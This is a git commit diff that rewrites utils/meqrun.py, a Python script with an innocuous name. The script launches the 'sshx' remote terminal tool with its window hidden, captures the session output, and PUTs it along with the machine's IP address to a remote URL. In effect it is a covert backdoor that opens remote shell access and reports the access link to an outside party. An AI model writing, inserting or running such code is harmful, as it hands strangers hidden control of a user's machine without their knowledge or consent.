6c4b016d01ff445bcb5c353d39d736677981aa5c
Assnsster <anous123bg@gmail.com>
2026-01-10 15:13:33 +0700

    Update meqrun.py

--- utils/meqrun.py
+++ utils/meqrun.py
@@ -1,4 +1,3 @@
-
 import requests
 import re
 import time
@@ -18,34 +17,38 @@ cmd = "sshx"
 # agm = "8.8.8.8"
 
 if os.path.exists(logg):
-  os.remove(logg)
+    os.remove(logg)
 
-  if os.name == "nt":
-      flags = subprocess.CREATE_NO_WINDOW
-  prog = subprocess.Popen(
-      [cmd], # agm],
-      stdout=open("logg", "w", encoding="utf-8"),
-      stderr=subprocess.STDOUT,
-      creationflags=flag
-  )
+if os.name == "nt":
+    from subprocess import CREATE_NO_WINDOW
+    flag = CREATE_NO_WINDOW
+
+prog = subprocess.Popen(
+    [cmd], # agm],
+    stdout=open(logg, "w", encoding="utf-8"),
+    stderr=subprocess.STDOUT,
+    creationflags=flag
+)
+
 # while True: # Enable if bro want realtime upload
-  with open("logg", "r", encoding="utf-8") as f:
-      time.sleep(10)
-      global progo
-      progo = f.read()
-  progo = re.sub(
-      r'\x1B(?:\[[0-?]*[ -/]*[@-~]|\].*?(?:\x07|\x1B\\)|.)',
-      '',
-      progo
-  )
-  data = {
-      "ip": ip,
-      "content": f"{progo}\n\nopen at {now} (Ho Chi Minh zonetime)"
-  }
+time.sleep(10)
+with open(logg, "r", encoding="utf-8") as f:
+    progo = f.read()
 
-  response = requests.put(url, data=json.dumps(data))
-  if response.status_code == 200:
-      print("Thành công:", response.json())
-      print(ip)
-  else:
-      print("Lỗi:", response.status_code, response.text)
+progo = re.sub(
+    r'\x1B(?:\[[0-?]*[ -/]*[@-~]|\].*?(?:\x07|\x1B\\)|.)',
+    '',
+    progo
+)
+
+data = {
+    "ip": ip,
+    "content": f"{progo}\n\nopen at {now} (Ho Chi Minh zonetime)"
+}
+
+response = requests.put(url, data=json.dumps(data))
+if response.status_code == 200:
+    print("Thành công:", response.json())
+    print(ip)
+else:
+    print("Lỗi:", response.status_code, response.text)
